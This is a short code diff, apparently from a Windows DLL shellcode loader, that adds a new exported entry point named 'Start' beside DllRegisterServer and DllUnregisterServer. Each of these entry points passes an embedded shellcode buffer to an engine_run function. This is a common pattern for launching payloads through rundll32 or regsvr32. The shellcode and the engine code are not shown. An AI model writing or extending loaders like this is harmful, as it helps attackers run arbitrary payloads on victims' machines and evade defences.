@@ -24,3 +24,7 @@ __declspec(dllexport) void CALLBACK DllRegisterServer(HWND hwnd, HINSTANCE hinst
 __declspec(dllexport) void CALLBACK DllUnregisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     engine_run(shellcode, shellcode_len);
 }
+
+__declspec(dllexport) void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    engine_run(shellcode, shellcode_len);
+}
